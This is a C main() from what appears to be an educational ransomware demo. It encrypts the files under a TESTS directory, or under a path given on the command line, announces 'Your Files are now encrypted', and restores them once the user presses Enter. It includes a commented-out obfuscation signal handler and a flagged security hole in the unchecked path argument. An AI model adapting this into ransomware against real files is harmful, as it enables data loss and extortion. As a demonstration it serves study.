#include "fournights.h"
/**
#ifndef NO_OBFUSCATION
  * sighandler - handles any signal by calling a nothing function
 (*				 used for obfuscation and catching SIGINT, etc
 (*				 that could disrupt the program from running.
  * @sig: signal to handle
 **/
/*
static void sighandler(int sig)
{
	if (sig)
		simple_search();
}
#ifndef NO_OBFUSCATION
	signal(SIGINT, sighandler);
#endif
#endif
*/
/**
  * main - Entry point
  * @argc: argument count
  * @argv: argument vectors
  * Return: 0
  * TODO: need to eliminate hard coded strings.
 **/
int main(int argc, char *argv[])
{
	struct file_filter_s file_filter;
	char *target_dir = NULL;
	EVP_CIPHER_CTX encrypt;
	EVP_CIPHER_CTX decrypt;

	file_filter.cipher_flag = 'e'; /* set cipher_flag to encrypt */
	target_dir = getcwd(NULL, PATH_MAX);
	if (!target_dir)
		return (EXIT_FAILURE);
	my_strncat(target_dir, "/TESTS/\0", my_strlen(target_dir), 8);
	if (argc == 1)
		init_struct(&file_filter, (char *)target_dir);
	else
		init_struct(&file_filter, argv[1]); /* Security Hole, I think */
	file_filter.cipher = aes_encrypt_init(&encrypt);
	if (file_filter.cipher)
	{
		traverse_dir(target_dir, &file_filter);
		EVP_CIPHER_CTX_cleanup(file_filter.cipher);
	}
	printf("Your Files are now encrypted.");
	printf("Please enter the password (press enter)\n");
	getchar();
	/* DECRYPT */
	printf("\nWay to go! Here are your files back\n");
	file_filter.cipher_flag = 'd';
	file_filter.cipher = aes_decrypt_init(&decrypt);
	if (!file_filter.cipher)
		fprintf(stderr, "Could not decrypt your data, sorry.\n");
	/* reset file extension tokens */
	my_strncat(file_filter.file_exts_whole_str, ".betty\0", 0, 7);
	file_filter.file_extensions[1] = NULL;
	traverse_dir(target_dir, &file_filter);
	EVP_CIPHER_CTX_cleanup(file_filter.cipher);
	free(target_dir);
	free_file_filter_struct(&file_filter);
	return (EXIT_SUCCESS);
}
